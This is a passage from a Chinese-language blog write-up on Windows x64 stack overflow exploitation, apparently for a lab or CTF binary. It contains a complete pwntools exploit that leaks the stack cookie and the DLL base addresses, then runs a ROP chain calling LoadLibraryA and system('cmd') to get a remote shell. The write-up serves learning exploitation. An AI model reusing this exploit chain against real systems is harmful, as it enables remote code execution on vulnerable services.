class="line">p.send(&quot;A&quot;*0x100+p64(stack_cookie)+&quot;a&quot;*0x10+p64(main_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0xf8+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">stack_cookie=u64(p.recvuntil(&apos;\r\n&apos;,drop = True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;stack_cookie3=&quot;,hex(stack_cookie)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0x170+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">ntdll_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))-0x73691</span><br></pre></td></tr></table></figure>
<p>这里<code>kernel32.dll</code>与<code>ntdll.dll</code>基址的计算可能会因为dll文件小版本的不同而不一样。<br>接下来我们需要去找到我们需要的代码块  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop_rcx_ret=ntdll_addr+0x8da1d</span><br><span class="line">add_brbp_esi_ret=kernel32_addr+0xdf43 #+0x2c</span><br><span class="line">pop_rbp_ret=kernel32_addr+0x12b1</span><br><span class="line">pop_rsi_ret=kernel32_addr+0x14a5</span><br><span class="line">jmp_rax=kernel32_addr+0x222d0</span><br><span class="line">add_rax_rcx=kernel32_addr+0x6f2ce</span><br><span class="line">system_offiet=0xA9CC0</span><br></pre></td></tr></table></figure>
<p>这里的偏移我们要根据自己的dll文件来判断.<br>我们通过    </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add [rbp], rsi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>来进行字符串的写入.<br>但是我们翻了一圈也只找到类似的代码<br>命令<br><code>ROPgadget --binary kernel32.dll --only &quot;add|ret&quot; | grep rbp</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000018000df43 : add dword ptr [rbp - 0x2c], esi ; ret</span><br></pre></td></tr></table></figure>
<p>不过我们至少能写入了  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload=&quot;A&quot;*0x100+p64(stack_cookie)+p64(0)+p64(system_offiet)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0x74726375) #curt</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c+0x4)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0x65736162) #base</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c+0x8)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0x6C6C642E) #.dll</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c+0xc)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0)</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c+0x10)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0x646D63)  # cmd</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br></pre></td></tr></table></figure>
<p>这样我们就实现了写入<code>cmd</code>与<code>curtbase.dll</code>字符串<br>我们可以用windbg看一下。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; da /c 30 0x7ff790733e80 </span><br><span class="line">00007ff7`90733e80  &quot;ucrtbase.dll&quot;</span><br><span class="line">0:000&gt; da /c 30 0x7ff790733e90 </span><br><span class="line">00007ff7`90733e90  &quot;cmd&quot;</span><br></pre></td></tr></table></figure>
<p>可以看出我们将字符串写入程序内。<br>接下来我们只需要调用<code>LoadLibraryA(&#39;ucrtbase.dll&#39;)-&gt;system(&#39;cmd&#39;)</code> 就可以  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_rcx_ret)+p64(data_addr)+p64(pop_rsi_ret)+p64(add_rax_rcx)+p64(LoadLibraryA)</span><br><span class="line">payload+=p64(pop_rcx_ret)+p64(system_offiet)+p64(add_rax_rcx)</span><br><span class="line">payload+=p64(pop_rcx_ret)+p64(data_addr+0x10)+p64(jmp_rax)</span><br></pre></td></tr></table></figure>
<p>上面的payload的大概意思就是将<code>ucrtbase.dll</code>字符串放入rcx寄存器，然后调用<code>LoadLibraryA</code>函数，然后将<code>system</code>的偏移放入rcx寄存器,通过<code>add rax，rcx</code>来将rax加到shell的地址<br>然后通过<code>pop rcx</code>将cmd放入rcx寄存器，最后<code>jmp rax</code>执行<code>system(&#39;cmd&#39;)</code>  </p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;10.160.111.186&quot;, 10000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0xf8+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">stack_cookie=u64(p.recvuntil(&apos;\r\n&apos;,drop = True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;stack_cookie1=&quot;,hex(stack_cookie)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0x110+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">exe_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))-0x12f4</span><br><span class="line">print hex(exe_addr)</span><br><span class="line"></span><br><span class="line">data_addr = exe_addr + 0x3e80</span><br><span class="line">main_addr=exe_addr+0x1000</span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0x100+p64(stack_cookie)+&quot;a&quot;*0x10+p64(main_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0xf8+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">stack_cookie=u64(p.recvuntil(&apos;\r\n&apos;,drop = True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;stack_cookie2=&quot;,hex(stack_cookie)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0x148+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">kernel32_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))-0x14034</span><br><span class="line">print &quot;kernel32.dll=&quot;,hex(kernel32_addr)</span><br><span class="line">LoadLibraryA=kernel32_addr+0x1E710</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0x100+p64(stack_cookie)+&quot;a&quot;*0x10+p64(main_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0xf8+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">stack_cookie=u64(p.recvuntil(&apos;\r\n&apos;,drop = True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;stack_cookie3=&quot;,hex(stack_cookie)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">p.send(&quot;A&quot;*0x170+&quot;ACADDADD&quot;)</span><br><span class="line">p.recvuntil(&quot;ACADDADD&quot;)</span><br><span class="line">ntdll_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))-0x73691</span><br><span class="line"></span><br><span class="line">pop_rcx_ret=ntdll_addr+0x8da1d</span><br><span class="line">add_brbp_esi_ret=kernel32_addr+0xdf43 #+0x2c</span><br><span class="line">pop_rbp_ret=kernel32_addr+0x12b1</span><br><span class="line">pop_rsi_ret=kernel32_addr+0x14a5</span><br><span class="line">jmp_rax=kernel32_addr+0x222d0</span><br><span class="line">add_rax_rcx=kernel32_addr+0x6f2ce</span><br><span class="line">system_offiet=0xA9CC0</span><br><span class="line"></span><br><span class="line">print &quot;pop_rsi_ret=&quot;,hex(pop_rsi_ret)</span><br><span class="line">print &quot;pop_rbp_ret=&quot;,hex(pop_rbp_ret)</span><br><span class="line">print &quot;pop_rcx_ret=&quot;,hex(pop_rcx_ret)</span><br><span class="line"></span><br><span class="line">print &quot;ntdll.dll=&quot;,hex(ntdll_addr)</span><br><span class="line">print &quot;data_addr=&quot;,hex(data_addr)</span><br><span class="line">p.recvuntil(&quot;input:&quot;)</span><br><span class="line">pause()</span><br><span class="line">payload=&quot;A&quot;*0x100+p64(stack_cookie)+p64(0)+p64(system_offiet)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0x74726375)</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c+0x4)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0x65736162)</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c+0x8)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0x6C6C642E)</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c+0xc)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0)</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(data_addr+0x2c+0x10)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(0x646D63)</span><br><span class="line">payload+=p64(add_brbp_esi_ret)</span><br><span class="line">payload+=p64(pop_rcx_ret)+p64(data_addr)+p64(pop_rsi_ret)+p64(add_rax_rcx)+p64(LoadLibraryA)</span><br><span class="line">payload+=p64(pop_rcx_ret)+p64(system_offiet)+p64(add_rax_rcx)</span><br><span class="line">payload+=p64(pop_rcx_ret)+p64(data_addr+0x10)+p64(jmp_rax)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive() # interactive2 for Remote available</span><br></pre></td></tr></table></figure>
<p>效果：<br><img src="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/7.jpg" alt><br>成功弹出shell。  </p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Win下的栈溢出比Linux下的栈溢出麻烦一点，但是由于SEH机制的问题，导致Win下的栈溢出不仅可以覆写返回地址，还可以伪造SEH来实现指针劫持。<br>初次学习，写这个来记录下过程。</p>
</div><div class="tags"><a href="/tags/WINPWN/">WINPWN</a></div><div class="post-nav"><a class="next" href="/2020/08/03/2020WMCTFTF-cfgo-CheckIn/">2020WMCTF_cfgo_CheckIn</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' ? true : false;
var verify = 'false' ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'AXNWQSAnzhoRuAsbsdqT84uQ-gzGzoHsz',
  appKey:'EcvRS3Hc6zidBU6GIBE3xBJN',
  placeholder:'Just so so',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Writeup/" style="font-size: 15px;">Writeup</a> <a href="/tags/Kernel/" style="font-size: 15px;">Kernel</a> <a href="/tags/%E5%A0%86/" style="font-size: 15px;">堆</a> <a href="/tags/WINPWN/" style="font-size: 15px;">WINPWN</a> <a href="/tags/angr/" style="font-size: 15px;">angr</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 15px;">总结</a> <a href="/tags/%E6%A0%88/" style="font-size: 15px;">栈</a> <a href="/tags/arm/" style="font-size: 15px;">arm</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 15px;">格式化字符串</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/">WINPWN栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/03/2020WMCTFTF-cfgo-CheckIn/">2020WMCTF_cfgo_CheckIn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/DASCTF-7%E6%9C%88pwn/">DASCTF 7月部分pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/01/%E6%9F%90%E5%A0%86%E5%A4%8D%E7%8E%B0-getchar%E5%BC%95%E5%8F%91malloc/">某堆复现(getchar引发malloc)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/22/angr%E5%88%9D%E6%8E%A2/">angr初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/03/RCTF-no-write/">RCTF no_write</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/24/GKCTF-pwn-Domo/">GKCTF_pwn_Domo(出题人角度)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/30/kernel-%C2%96%C2%96D-ublele-Fetch%E8%AF%A6%E8%A7%A3/">kernel_Double_Fetch详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/27/%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E8%B5%9BPWN/">安恒四月赛PWN</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/13/exit-hook%E6%94%BB%E5%87%BB/">exit_hook攻击</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://whali3n51.github.io/" title="whali3n51" target="_blank">whali3n51</a><ul></ul><a href="http://www.pdsdt.lovepdsdt.com/" title="Pdsdt" target="_blank">Pdsdt</a><ul></ul><a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a><ul></ul><a href="https://www.mydamya.top/" title="Damya" target="_blank">Damya</a><ul></ul><a href="http://phoebe233.cn/" title="W4nder" target="_blank">W4nder</a><ul></ul><a href="https://yojrevo.github.io/" title="yojrevo" target="_blank">yojrevo</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">starssgo.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>